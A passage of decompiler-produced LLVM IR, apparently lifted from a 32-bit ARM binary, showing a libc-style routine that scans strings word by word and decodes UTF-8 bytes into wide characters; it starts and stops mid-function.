  %v1_13988 = inttoptr i32 %v3_13984 to i32*
  %v2_13988 = load i32, i32* %v1_13988, align 4
  store i32 %v2_13988, i32* @r3, align 4
  %v2_1398c = icmp eq i32 %v2_13988, 0
  %v0_13994 = load i32, i32* %r5.global-to-local, align 4
  %v2_13994 = icmp eq i32 %v0_13994, 0
  br i1 %v2_1398c, label %dec_label_pc_13994, label %dec_label_pc_139f8

dec_label_pc_13994:                               ; preds = %dec_label_pc_13980
  br i1 %v2_13994, label %dec_label_pc_139a4, label %dec_label_pc_139b0.preheader

dec_label_pc_139b0.preheader:                     ; preds = %dec_label_pc_13994
  store i32 %v0_13994, i32* %r0.global-to-local, align 4
  %v1_1399c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_1399c, i32* %r2.global-to-local, align 4
  %v2_139b012 = icmp eq i32 %v1_1399c, 0
  store i32 57343, i32* @ip, align 4
  store i32 %v0_13994, i32* %lr.global-to-local, align 4
  br i1 %v2_139b012, label %dec_label_pc_13adc, label %dec_label_pc_139c0

dec_label_pc_139a4:                               ; preds = %dec_label_pc_13994
  %v0_139a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_139a4 = inttoptr i32 %v0_139a4 to i8*
  store i32 %v0_139a4, i32* %r0.global-to-local, align 4
  %v3_139a8 = call i32 @strlen(i8* %v1_139a4)
  store i32 %v3_139a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_139b0thread-pre-split:               ; preds = %dec_label_pc_139c0
  %v2_139dc = add i32 %v1_139dc, -1
  store i32 %v2_139dc, i32* %r2.global-to-local, align 4
  %v4_139e0 = inttoptr i32 %v0_139d8 to i32*
  store i32 %v2_139d0, i32* %v4_139e0, align 4
  %v0_139b0.pr = load i32, i32* %r2.global-to-local, align 4
  %v2_139b0 = icmp eq i32 %v0_139b0.pr, 0
  store i32 57343, i32* @ip, align 4
  %v0_139b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139b8, i32* %lr.global-to-local, align 4
  br i1 %v2_139b0, label %dec_label_pc_13adc, label %dec_label_pc_139c0

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139b0.preheader, %dec_label_pc_139b0thread-pre-split
  %v1_139dc = phi i32 [ %v0_139b0.pr, %dec_label_pc_139b0thread-pre-split ], [ %v1_1399c, %dec_label_pc_139b0.preheader ]
  %v0_139d8 = phi i32 [ %v0_139b8, %dec_label_pc_139b0thread-pre-split ], [ %v0_13994, %dec_label_pc_139b0.preheader ]
  %v0_139c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_139c0 = inttoptr i32 %v0_139c0 to i8*
  %v2_139c0 = load i8, i8* %v1_139c0, align 1
  %v3_139c0 = zext i8 %v2_139c0 to i32
  store i32 %v3_139c0, i32* %r1.global-to-local, align 4
  %v3_139c8 = sext i8 %v2_139c0 to i32
  store i32 %v3_139c8, i32* @r3, align 4
  %v2_139cc = icmp eq i8 %v2_139c0, 0
  %v2_139d0 = and i32 %v3_139c8, 57343
  store i32 %v2_139d0, i32* @ip, align 4
  %v1_139d4 = add i32 %v0_139c0, 1
  store i32 %v1_139d4, i32* %r4.global-to-local, align 4
  %v1_139d8 = add i32 %v0_139d8, 4
  store i32 %v1_139d8, i32* %r0.global-to-local, align 4
  br i1 %v2_139cc, label %dec_label_pc_139e8, label %dec_label_pc_139b0thread-pre-split

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139c0
  %v1_139e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_139e8 = sub i32 %v1_139e8, %v1_139dc
  store i32 %v2_139e8, i32* %r0.global-to-local, align 4
  %v1_139ec = load i32, i32* %r7.global-to-local, align 4
  %v2_139ec = inttoptr i32 %v1_139ec to i32*
  store i32 0, i32* %v2_139ec, align 4
  %v0_139f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_139f0 = load i32, i32* %lr.global-to-local, align 4
  %v2_139f0 = inttoptr i32 %v1_139f0 to i32*
  store i32 %v0_139f0, i32* %v2_139f0, align 4
  br label %dec_label_pc_13c58

dec_label_pc_139f8:                               ; preds = %dec_label_pc_13980
  %v0_13a04 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_13994, label %dec_label_pc_13a04, label %dec_label_pc_13ad4

dec_label_pc_13a04:                               ; preds = %dec_label_pc_139f8
  %v0_13a08.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a08

dec_label_pc_13a08:                               ; preds = %dec_label_pc_13acc, %dec_label_pc_13a04
  %v0_13a18 = phi i32 [ %v0_13a0830, %dec_label_pc_13acc ], [ %v0_13a08.pre, %dec_label_pc_13a04 ]
  %storemerge = phi i32 [ %v1_13acc, %dec_label_pc_13acc ], [ %v0_13a04, %dec_label_pc_13a04 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_13a08 = inttoptr i32 %v0_13a18 to i8*
  %v2_13a08 = load i8, i8* %v1_13a08, align 1
  %v3_13a08 = zext i8 %v2_13a08 to i32
  %v1_13a0c = add nsw i32 %v3_13a08, -1
  %tmp = icmp ugt i32 %v1_13a0c, 126
  br i1 %tmp, label %dec_label_pc_13a4c, label %dec_label_pc_13a18

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a08
  %v1_13a18 = urem i32 %v0_13a18, 4
  %v2_13a18 = icmp eq i32 %v1_13a18, 0
  br i1 %v2_13a18, label %dec_label_pc_13a2c.preheader, label %dec_label_pc_13a4c

dec_label_pc_13a2c.preheader:                     ; preds = %dec_label_pc_13a18
  %v1_13a2c73 = inttoptr i32 %v0_13a18 to i32*
  %v2_13a2c74 = load i32, i32* %v1_13a2c73, align 4
  %v2_13a3875 = add i32 %v2_13a2c74, -16843009
  %v2_13a3c76 = or i32 %v2_13a3875, %v2_13a2c74
  store i32 %v2_13a3c76, i32* %r2.global-to-local, align 4
  %v2_13a4077 = and i32 %v2_13a3c76, -2139062144
  store i32 %v2_13a4077, i32* %r1.global-to-local, align 4
  %v2_13a4478 = icmp eq i32 %v2_13a4077, 0
  br i1 %v2_13a4478, label %dec_label_pc_13a24, label %dec_label_pc_13a4c.loopexit

dec_label_pc_13a24:                               ; preds = %dec_label_pc_13a2c.preheader, %dec_label_pc_13a24
  %v0_13a2480 = phi i32 [ %v1_13a24, %dec_label_pc_13a24 ], [ %v0_13a18, %dec_label_pc_13a2c.preheader ]
  %v0_13a2879 = phi i32 [ %v1_13a28, %dec_label_pc_13a24 ], [ %storemerge, %dec_label_pc_13a2c.preheader ]
  %v1_13a24 = add i32 %v0_13a2480, 4
  store i32 %v1_13a24, i32* %r4.global-to-local, align 4
  %v1_13a28 = add i32 %v0_13a2879, -4
  store i32 %v1_13a28, i32* %r0.global-to-local, align 4
  %v1_13a2c = inttoptr i32 %v1_13a24 to i32*
  %v2_13a2c = load i32, i32* %v1_13a2c, align 4
  %v2_13a38 = add i32 %v2_13a2c, -16843009
  %v2_13a3c = or i32 %v2_13a38, %v2_13a2c
  store i32 %v2_13a3c, i32* %r2.global-to-local, align 4
  %v2_13a40 = and i32 %v2_13a3c, -2139062144
  store i32 %v2_13a40, i32* %r1.global-to-local, align 4
  %v2_13a44 = icmp eq i32 %v2_13a40, 0
  br i1 %v2_13a44, label %dec_label_pc_13a24, label %dec_label_pc_13a4c.loopexit

dec_label_pc_13a4c.loopexit:                      ; preds = %dec_label_pc_13a24, %dec_label_pc_13a2c.preheader
  %v0_13acc84 = phi i32 [ %storemerge, %dec_label_pc_13a2c.preheader ], [ %v1_13a28, %dec_label_pc_13a24 ]
  %v0_13a24.lcssa = phi i32 [ %v0_13a18, %dec_label_pc_13a2c.preheader ], [ %v1_13a24, %dec_label_pc_13a24 ]
  br label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a4c.loopexit, %dec_label_pc_13a18, %dec_label_pc_13a08
  %v0_13acc88 = phi i32 [ %v0_13acc84, %dec_label_pc_13a4c.loopexit ], [ %storemerge, %dec_label_pc_13a18 ], [ %storemerge, %dec_label_pc_13a08 ]
  %v0_13a70 = phi i32 [ %v0_13a24.lcssa, %dec_label_pc_13a4c.loopexit ], [ %v0_13a18, %dec_label_pc_13a18 ], [ %v0_13a18, %dec_label_pc_13a08 ]
  %v1_13a4c = inttoptr i32 %v0_13a70 to i8*
  %v2_13a4c = load i8, i8* %v1_13a4c, align 1
  %v3_13a4c = zext i8 %v2_13a4c to i32
  store i32 %v3_13a4c, i32* %r2.global-to-local, align 4
  %v1_13a50 = add nsw i32 %v3_13a4c, -1
  %tmp90 = icmp ult i32 %v1_13a50, 127
  br i1 %tmp90, label %dec_label_pc_13ac8, label %dec_label_pc_13a5c

dec_label_pc_13a5c:                               ; preds = %dec_label_pc_13a4c
  %v1_13a5c = add nsw i32 %v3_13a4c, -194
  store i32 %v1_13a5c, i32* %r2.global-to-local, align 4
  %tmp91 = icmp ugt i32 %v1_13a5c, 50
  br i1 %tmp91, label %dec_label_pc_13c20, label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a5c
  %v4_13a6c = mul nsw i32 %v1_13a5c, 4
  %v5_13a6c = add i32 %v4_13a6c, ptrtoint (i32* @global_var_1a858.674 to i32)
  %v6_13a6c = inttoptr i32 %v5_13a6c to i32*
  %v7_13a6c = load i32, i32* %v6_13a6c, align 4
  store i32 %v7_13a6c, i32* %r1.global-to-local, align 4
  %v1_13a70 = add i32 %v0_13a70, 1
  store i32 %v1_13a70, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a74

dec_label_pc_13a74:                               ; preds = %bb, %dec_label_pc_13a68
  %v0_13acc86 = phi i32 [ %v0_1394c, %bb ], [ %v0_13acc88, %dec_label_pc_13a68 ]
  %v0_13aac = phi i32 [ %v2_13958, %bb ], [ %v7_13a6c, %dec_label_pc_13a68 ]
  %v0_13a94 = phi i32 [ %v2_13950, %bb ], [ %v1_13a70, %dec_label_pc_13a68 ]
  %v1_13a74 = inttoptr i32 %v0_13a94 to i8*
  %v2_13a74 = load i8, i8* %v1_13a74, align 1
  %div89 = udiv i8 %v2_13a74, 8
  %v3_13a78 = zext i8 %div89 to i32
  %v1_13a7c = add nsw i32 %v3_13a78, -16
  %v4_13a80 = sdiv i32 %v0_13aac, 67108864
  %v5_13a80 = add nsw i32 %v3_13a78, %v4_13a80
  %v2_13a84 = or i32 %v1_13a7c, %v5_13a80
  %v1_13a88 = and i32 %v2_13a84, -8
  store i32 %v1_13a88, i32* %r2.global-to-local, align 4
  %v3_13a88 = icmp eq i32 %v1_13a88, 0
  br i1 %v3_13a88, label %dec_label_pc_13a90, label %dec_label_pc_13bb0

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a74
  %v2_13a80 = and i32 %v0_13aac, 33554432
  %v2_13a90 = icmp eq i32 %v2_13a80, 0
  %v1_13a94 = add i32 %v0_13a94, 1
  store i32 %v1_13a94, i32* %r4.global-to-local, align 4
  br i1 %v2_13a90, label %dec_label_pc_13acc, label %dec_label_pc_13a9c

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a90
  %v1_13a9c = inttoptr i32 %v1_13a94 to i8*
  %v2_13a9c = load i8, i8* %v1_13a9c, align 1
  %tmp92 = and i8 %v2_13a9c, -64
  %tmp93 = icmp eq i8 %tmp92, -128
  br i1 %tmp93, label %dec_label_pc_13aac, label %dec_label_pc_13bd8

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a9c
  %v1_13aac = and i32 %v0_13aac, 524288
  %v2_13aac = icmp eq i32 %v1_13aac, 0
  %v1_13ab0 = add i32 %v0_13a94, 2
  store i32 %v1_13ab0, i32* %r4.global-to-local, align 4
  br i1 %v2_13aac, label %dec_label_pc_13acc, label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13aac
  %v1_13ab8 = inttoptr i32 %v1_13ab0 to i8*
  %v2_13ab8 = load i8, i8* %v1_13ab8, align 1
  %tmp94 = and i8 %v2_13ab8, -64
  %tmp95 = icmp eq i8 %tmp94, -128
  br i1 %tmp95, label %dec_label_pc_13ac8, label %dec_label_pc_13c04

dec_label_pc_13ac8:                               ; preds = %dec_label_pc_13ab8, %dec_label_pc_13a4c
  %v0_13acc87 = phi i32 [ %v0_13acc86, %dec_label_pc_13ab8 ], [ %v0_13acc88, %dec_label_pc_13a4c ]
  %v0_13ac8 = phi i32 [ %v1_13ab0, %dec_label_pc_13ab8 ], [ %v0_13a70, %dec_label_pc_13a4c ]
  %v1_13ac8 = add i32 %v0_13ac8, 1
  store i32 %v1_13ac8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13acc:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13a90, %dec_label_pc_13ac8
  %v0_13acc = phi i32 [ %v0_13acc86, %dec_label_pc_13aac ], [ %v0_13acc86, %dec_label_pc_13a90 ], [ %v0_13acc87, %dec_label_pc_13ac8 ]
  %v0_13a0830 = phi i32 [ %v1_13ab0, %dec_label_pc_13aac ], [ %v1_13a94, %dec_label_pc_13a90 ], [ %v1_13ac8, %dec_label_pc_13ac8 ]
  %v1_13acc = add i32 %v0_13acc, -1
  br label %dec_label_pc_13a08

dec_label_pc_13ad4:                               ; preds = %dec_label_pc_139f8, %dec_label_pc_13c10
  %storemerge60 = phi i32 [ %v1_13c10, %dec_label_pc_13c10 ], [ %v0_13a04, %dec_label_pc_139f8 ]
  %v1_13b00 = phi i32 [ %v1_13b0019, %dec_label_pc_13c10 ], [ %v0_13994, %dec_label_pc_139f8 ]
  store i32 %storemerge60, i32* %r0.global-to-local, align 4
  %v2_13ad4 = icmp eq i32 %storemerge60, 0
  br i1 %v2_13ad4, label %dec_label_pc_13adc, label %dec_label_pc_13ae8

dec_label_pc_13adc:                               ; preds = %dec_label_pc_139b0thread-pre-split, %dec_label_pc_139b0.preheader, %dec_label_pc_13ad4
  %v0_13adc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13adc, i32* %r0.global-to-local, align 4
  %v0_13ae0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ae0 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ae0 = inttoptr i32 %v1_13ae0 to i32*
  store i32 %v0_13ae0, i32* %v2_13ae0, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ad4
  %v0_13ae8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ae8 = inttoptr i32 %v0_13ae8 to i8*
  %v2_13ae8 = load i8, i8* %v1_13ae8, align 1
  %v3_13ae8 = zext i8 %v2_13ae8 to i32
  %v1_13aec = add nsw i32 %v3_13ae8, -1
  %tmp96 = icmp ugt i32 %v1_13aec, 126
  br i1 %tmp96, label %dec_label_pc_13b64, label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13ae8
  %v1_13af8 = urem i32 %v0_13ae8, 4
  %v2_13af8 = icmp eq i32 %v1_13af8, 0
  store i32 %v0_13ae8, i32* %r2.global-to-local, align 4
  br i1 %v2_13af8, label %dec_label_pc_13b30.preheader, label %dec_label_pc_13b64

dec_label_pc_13b30.preheader:                     ; preds = %dec_label_pc_13af8
  store i32 %v1_13b00, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13b48
  %v2_13b0c = inttoptr i32 %v0_13b48 to i8*
  %v3_13b0c = load i8, i8* %v2_13b0c, align 1
  %v4_13b0c = zext i8 %v3_13b0c to i32
  %v3_13b10 = inttoptr i32 %v0_13b5c to i32*
  store i32 %v4_13b0c, i32* %v3_13b10, align 4
  %v0_13b14 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b14 = add i32 %v0_13b14, -3
  %v2_13b14 = inttoptr i32 %v1_13b14 to i8*
  %v3_13b14 = load i8, i8* %v2_13b14, align 1
  %v4_13b14 = zext i8 %v3_13b14 to i32
  %v1_13b18 = load i32, i32* %r1.global-to-local, align 4
  %v2_13b18 = add i32 %v1_13b18, -12
  %v3_13b18 = inttoptr i32 %v2_13b18 to i32*
  store i32 %v4_13b14, i32* %v3_13b18, align 4
  %v0_13b1c = load i32, i32* %r2.global-to-local, align 4
  %v1_13b1c = add i32 %v0_13b1c, -2
  %v2_13b1c = inttoptr i32 %v1_13b1c to i8*
  %v3_13b1c = load i8, i8* %v2_13b1c, align 1
  %v4_13b1c = zext i8 %v3_13b1c to i32
  %v1_13b20 = load i32, i32* %r1.global-to-local, align 4
  %v2_13b20 = add i32 %v1_13b20, -8
  %v3_13b20 = inttoptr i32 %v2_13b20 to i32*
  store i32 %v4_13b1c, i32* %v3_13b20, align 4
  %v0_13b24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b24 = add i32 %v0_13b24, -1
  %v2_13b24 = inttoptr i32 %v1_13b24 to i8*
  %v3_13b24 = load i8, i8* %v2_13b24, align 1
  %v4_13b24 = zext i8 %v3_13b24 to i32
  %v1_13b28 = load i32, i32* %r1.global-to-local, align 4
  %v2_13b28 = add i32 %v1_13b28, -4
  %v3_13b28 = inttoptr i32 %v2_13b28 to i32*
  store i32 %v4_13b24, i32* %v3_13b28, align 4
  %v0_13b2c = load i32, i32* %r0.global-to-local, align 4
  %v1_13b2c = add i32 %v0_13b2c, -4
  store i32 %v1_13b2c, i32* %r0.global-to-local, align 4
  %v0_13b3c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_13b40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13b30:                               ; preds = %dec_label_pc_13b30.preheader, %dec_label_pc_13b0c
  %v0_13b48 = phi i32 [ %v0_13ae8, %dec_label_pc_13b30.preheader ], [ %v0_13b40.pre, %dec_label_pc_13b0c ]
  %v0_13b5c = phi i32 [ %v1_13b00, %dec_label_pc_13b30.preheader ], [ %v0_13b3c.pre, %dec_label_pc_13b0c ]
  %v0_13b30 = phi i32 [ %storemerge60, %dec_label_pc_13b30.preheader ], [ %v1_13b2c, %dec_label_pc_13b0c ]
  store i32 -16843009, i32* @ip, align 4
  store i32 -2139062144, i32* @lr, align 4
  store i32 %v0_13b5c, i32* %r5.global-to-local, align 4
  store i32 %v0_13b48, i32* %r4.global-to-local, align 4
  %tmp97 = icmp ult i32 %v0_13b30, 5
  br i1 %tmp97, label %dec_label_pc_13b64, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b30
  %v1_13b48 = inttoptr i32 %v0_13b48 to i32*
  %v2_13b48 = load i32, i32* %v1_13b48, align 4
  %v4_13b48 = add i32 %v0_13b48, 4
  store i32 %v4_13b48, i32* %r2.global-to-local, align 4
  %v2_13b4c = add i32 %v2_13b48, -16843009
  store i32 %v2_13b4c, i32* @ip, align 4
  %v2_13b50 = or i32 %v2_13b4c, %v2_13b48
  %v2_13b54 = and i32 %v2_13b50, -2139062144
  store i32 %v2_13b54, i32* @lr, align 4
  %v2_13b58 = icmp eq i32 %v2_13b54, 0
  %v1_13b5c = add i32 %v0_13b5c, 16
  store i32 %v1_13b5c, i32* %r1.global-to-local, align 4
  br i1 %v2_13b58, label %dec_label_pc_13b0c, label %dec_label_pc_13b64

dec_label_pc_13b64:                               ; preds = %dec_label_pc_13b48, %dec_label_pc_13b30, %dec_label_pc_13af8, %dec_label_pc_13ae8
  %v0_13c20.pre = phi i32 [ %v0_13ae8, %dec_label_pc_13af8 ], [ %v0_13ae8, %dec_label_pc_13ae8 ], [ %v0_13b48, %dec_label_pc_13b30 ], [ %v0_13b48, %dec_label_pc_13b48 ]
  %v5_13b70 = phi i32 [ %v1_13b00, %dec_label_pc_13af8 ], [ %v1_13b00, %dec_label_pc_13ae8 ], [ %v0_13b5c, %dec_label_pc_13b30 ], [ %v0_13b5c, %dec_label_pc_13b48 ]
  %v1_13b64 = inttoptr i32 %v0_13c20.pre to i8*
  %v2_13b64 = load i8, i8* %v1_13b64, align 1
  %v3_13b64 = zext i8 %v2_13b64 to i32
  store i32 %v3_13b64, i32* %r2.global-to-local, align 4
  %v1_13b68 = add nsw i32 %v3_13b64, -1
  store i32 %v1_13b68, i32* @r3, align 4
  %tmp98 = icmp ult i32 %v1_13b68, 127
  br i1 %tmp98, label %.thread, label %dec_label_pc_13b7c

.thread:                                          ; preds = %dec_label_pc_13b64
  %v6_13b70 = inttoptr i32 %v5_13b70 to i32*
  store i32 %v3_13b64, i32* %v6_13b70, align 4
  %v7_13b70 = load i32, i32* %r5.global-to-local, align 4
  %v8_13b70 = add i32 %v7_13b70, 4
  store i32 %v8_13b70, i32* %r5.global-to-local, align 4
  %v4_13b74 = load i32, i32* %r4.global-to-local, align 4
  %v5_13b74 = add i32 %v4_13b74, 1
  store i32 %v5_13b74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13b64
  %v1_13b7c = add nsw i32 %v3_13b64, -194
  store i32 %v1_13b7c, i32* %r2.global-to-local, align 4
  %tmp99 = icmp ugt i32 %v1_13b7c, 50
  br i1 %tmp99, label %dec_label_pc_13c20, label %dec_label_pc_13b88

dec_label_pc_13b88:                               ; preds = %dec_label_pc_13b7c
  %v4_13b8c = mul nsw i32 %v1_13b7c, 4
  %v5_13b8c = add i32 %v4_13b8c, ptrtoint (i32* @global_var_1a858.674 to i32)
  %v6_13b8c = inttoptr i32 %v5_13b8c to i32*
  %v7_13b8c = load i32, i32* %v6_13b8c, align 4
  store i32 %v7_13b8c, i32* %r1.global-to-local, align 4
  %v1_13b90 = add i32 %v0_13c20.pre, 1
  store i32 %v1_13b90, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b94

dec_label_pc_13b94:                               ; preds = %.thread.dec_label_pc_13b94_crit_edge, %dec_label_pc_13b88
  %v1_13bbc = phi i32 [ %v1_13ba0.pre, %.thread.dec_label_pc_13b94_crit_edge ], [ %v7_13b8c, %dec_label_pc_13b88 ]
  %v0_13bc0 = phi i32 [ %v0_13b94.pre, %.thread.dec_label_pc_13b94_crit_edge ], [ %v1_13b90, %dec_label_pc_13b88 ]
  %v1_13b94 = inttoptr i32 %v0_13bc0 to i8*
  %v2_13b94 = load i8, i8* %v1_13b94, align 1
  %v3_13b94 = zext i8 %v2_13b94 to i32
  store i32 %v3_13b94, i32* @ip, align 4
  %div = udiv i8 %v2_13b94, 8
  %v3_13b98 = zext i8 %div to i32
  %v1_13b9c = add nsw i32 %v3_13b98, -16
  %v4_13ba0 = sdiv i32 %v1_13bbc, 67108864
  %v5_13ba0 = add nsw i32 %v3_13b98, %v4_13ba0
  %v2_13ba4 = or i32 %v1_13b9c, %v5_13ba0
  %v1_13ba8 = and i32 %v2_13ba4, -8
  store i32 %v1_13ba8, i32* %r2.global-to-local, align 4
  %v3_13ba8 = icmp eq i32 %v1_13ba8, 0
  br i1 %v3_13ba8, label %dec_label_pc_13bb8, label %dec_label_pc_13bb0

dec_label_pc_13bb0:                               ; preds = %dec_label_pc_13a74, %dec_label_pc_13b94
  %v0_13c1841 = phi i32 [ %v0_13aac, %dec_label_pc_13a74 ], [ %v1_13bbc, %dec_label_pc_13b94 ]
  %v0_13bb0 = phi i32 [ %v0_13a94, %dec_label_pc_13a74 ], [ %v0_13bc0, %dec_label_pc_13b94 ]
  %v1_13bb0 = add i32 %v0_13bb0, -1
  store i32 %v1_13bb0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c18

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13b94
  %v1_13bb8 = add nsw i32 %v3_13b94, -128
  store i32 %v1_13bb8, i32* @r3, align 4
  %v4_13bbc = mul i32 %v1_13bbc, 64
  %v5_13bbc = or i32 %v1_13bb8, %v4_13bbc
  store i32 %v5_13bbc, i32* %r1.global-to-local, align 4
  %v6_13bbc = icmp slt i32 %v5_13bbc, 0
  %v1_13bc0 = add i32 %v0_13bc0, 1
  store i32 %v1_13bc0, i32* %r4.global-to-local, align 4
  br i1 %v6_13bbc, label %dec_label_pc_13bc8, label %dec_label_pc_13c0c

dec_label_pc_13bc8:                               ; preds = %dec_label_pc_13bb8
  %v1_13bc8 = inttoptr i32 %v1_13bc0 to i8*
  %v2_13bc8 = load i8, i8* %v1_13bc8, align 1
  %v3_13bc8 = zext i8 %v2_13bc8 to i32
  %v1_13bcc = add nsw i32 %v3_13bc8, -128
  store i32 %v1_13bcc, i32* @r3, align 4
  %tmp100 = icmp ult i32 %v1_13bcc, 64
  br i1 %tmp100, label %dec_label_pc_13be0, label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13a9c, %dec_label_pc_13bc8
  %v0_13c1843 = phi i32 [ %v5_13bbc, %dec_label_pc_13bc8 ], [ %v0_13aac, %dec_label_pc_13a9c ]
  %v0_13bd8 = phi i32 [ %v1_13bc0, %dec_label_pc_13bc8 ], [ %v1_13a94, %dec_label_pc_13a9c ]
  %v1_13bd8 = add i32 %v0_13bd8, -2
  store i32 %v1_13bd8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c18

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bc8
  %v4_13be0 = mul i32 %v5_13bbc, 64
  %v5_13be0 = or i32 %v1_13bcc, %v4_13be0
  store i32 %v5_13be0, i32* %r1.global-to-local, align 4
  %v6_13be0 = icmp slt i32 %v5_13be0, 0
  %v1_13be4 = add i32 %v0_13bc0, 2
  store i32 %v1_13be4, i32* %r4.global-to-local, align 4
  br i1 %v6_13be0, label %dec_label_pc_13bec, label %dec_label_pc_13c0c

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13be0
  %v1_13bec = inttoptr i32 %v1_13be4 to i8*
  %v2_13bec = load i8, i8* %v1_13bec, align 1
  %v3_13bec = zext i8 %v2_13bec to i32
  %v1_13bf0 = add nsw i32 %v3_13bec, -128
  store i32 %v1_13bf0, i32* @r3, align 4
  %v2_13bf4 = icmp ugt i32 %v1_13bf0, 62
  %v7_13bf4 = icmp eq i32 %v1_13bf0, 63
  %v2_13bf8 = xor i1 %v2_13bf4, true
  %v3_13bf8 = or i1 %v7_13bf4, %v2_13bf8
  br i1 %v3_13bf8, label %bb67, label %bb68

bb67:                                             ; preds = %dec_label_pc_13bec
  %v6_13bf8 = and i32 %v5_13be0, 67108864
  %v7_13bf8 = icmp ne i32 %v6_13bf8, 0
  %v8_13bf8 = mul i32 %v5_13be0, 64
  %v9_13bf8 = or i32 %v1_13bf0, %v8_13bf8
  store i32 %v9_13bf8, i32* %r1.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_13bec, %bb67
  %v0_13c0c28 = phi i32 [ %v5_13be0, %dec_label_pc_13bec ], [ %v9_13bf8, %bb67 ]
  %v1_13c00 = phi i1 [ %v2_13bf4, %dec_label_pc_13bec ], [ %v7_13bf8, %bb67 ]
  %v2_13bfc = xor i1 %v1_13c00, true
  %v3_13bfc = or i1 %v7_13bf4, %v2_13bfc
  br i1 %v3_13bfc, label %.thread58, label %dec_label_pc_13c04

.thread58:                                        ; preds = %bb68
  %v5_13bfc = add i32 %v0_13bc0, 3
  store i32 %v5_13bfc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13c04:                               ; preds = %dec_label_pc_13ab8, %bb68
  %v0_13c1842 = phi i32 [ %v0_13aac, %dec_label_pc_13ab8 ], [ %v0_13c0c28, %bb68 ]
  %v0_13c04 = phi i32 [ %v1_13ab0, %dec_label_pc_13ab8 ], [ %v1_13be4, %bb68 ]
  %v1_13c04 = add i32 %v0_13c04, -3
  store i32 %v1_13c04, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c18

dec_label_pc_13c0c:                               ; preds = %.thread58, %dec_label_pc_13be0, %dec_label_pc_13bb8
  %v0_13c0c = phi i32 [ %v5_13be0, %dec_label_pc_13be0 ], [ %v5_13bbc, %dec_label_pc_13bb8 ], [ %v0_13c0c28, %.thread58 ]
  %v1_13c0c = load i32, i32* %r5.global-to-local, align 4
  %v2_13c0c = inttoptr i32 %v1_13c0c to i32*
  store i32 %v0_13c0c, i32* %v2_13c0c, align 4
  %v3_13c0c = load i32, i32* %r5.global-to-local, align 4
  %v4_13c0c = add i32 %v3_13c0c, 4
  store i32 %v4_13c0c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %.thread, %dec_label_pc_13c0c
  %v1_13b0019 = phi i32 [ %v4_13c0c, %dec_label_pc_13c0c ], [ %v8_13b70, %.thread ]
  %v0_13c10 = load i32, i32* %r0.global-to-local, align 4
  %v1_13c10 = add i32 %v0_13c10, -1
  br label %dec_label_pc_13ad4

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13c04, %dec_label_pc_13bd8, %dec_label_pc_13bb0
  %v0_13c2045 = phi i32 [ %v1_13c04, %dec_label_pc_13c04 ], [ %v1_13bd8, %dec_label_pc_13bd8 ], [ %v1_13bb0, %dec_label_pc_13bb0 ]
  %v0_13c18 = phi i32 [ %v0_13c1842, %dec_label_pc_13c04 ], [ %v0_13c1843, %dec_label_pc_13bd8 ], [ %v0_13c1841, %dec_label_pc_13bb0 ]
  %v2_13c18 = icmp eq i32 %v0_13c18, 0
  br i1 %v2_13c18, label %dec_label_pc_13c20, label %dec_label_pc_13c40

dec_label_pc_13c20:                               ; preds = %dec_label_pc_13b7c, %dec_label_pc_13c18, %dec_label_pc_13a5c
  %v0_13c20 = phi i32 [ %v0_13c2045, %dec_label_pc_13c18 ], [ %v0_13a70, %dec_label_pc_13a5c ], [ %v0_13c20.pre, %dec_label_pc_13b7c ]
  %v1_13c20 = inttoptr i32 %v0_13c20 to i8*
  %v2_13c20 = load i8, i8* %v1_13c20, align 1
